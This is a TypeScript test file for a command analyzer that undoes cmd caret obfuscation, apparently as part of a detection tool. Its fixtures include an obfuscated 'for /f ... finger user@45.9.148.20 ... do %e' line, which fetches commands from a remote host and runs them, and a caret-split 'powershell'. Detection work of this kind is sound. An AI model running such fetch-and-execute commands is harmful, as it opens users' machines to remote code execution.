// shared/analyzer/__tests__/cmdlex.test.ts
import { describe, expect, it } from 'vitest'
import { deobfuscateCaret } from '../cmdlex'
import { preprocess } from '../preprocess'

describe('deobfuscateCaret', () => {
  it('collapses ^^ to ^ outside quotes', () => {
    expect(deobfuscateCaret('sometext^^more')).toBe('sometext^more')
  })

  it('drops a bare ^ outside quotes, keeping the next character literally', () => {
    expect(deobfuscateCaret('f^inger user@45.9.148.20')).toBe('finger user@45.9.148.20')
    expect(deobfuscateCaret('p^o^w^e^r^s^h^e^l^l')).toBe('powershell')
  })

  it('leaves carets untouched inside "..."', () => {
    expect(deobfuscateCaret('"^https?://"')).toBe('"^https?://"')
  })

  it('caret-processes inside a for /f \'list\' single-quoted segment (not a cmd string-literal quote)', () => {
    const input = "for /f %e in ('f^inger user@45.9.148.20') do %e"
    expect(deobfuscateCaret(input)).toBe("for /f %e in ('finger user@45.9.148.20') do %e")
  })

  it('a trailing ^ at end-of-line is a line-continuation marker — does not consume past EOL', () => {
    expect(deobfuscateCaret('echo hi^')).toBe('echo hi^')
    expect(deobfuscateCaret('echo hi^\r\nmore')).toBe('echo hi^\r\nmore')
  })
})

describe('the non-negotiable interpreter gate', () => {
  it('a PowerShell regex literal with a caret is byte-identical when interpreter !== cmd', () => {
    const input = "Where-Object { $_.Path -match '^https?://' }"
    const r = preprocess(input)
    expect(r.interpreter).not.toBe('cmd')
    expect(r.script).toContain("'^https?://'")
  })
})
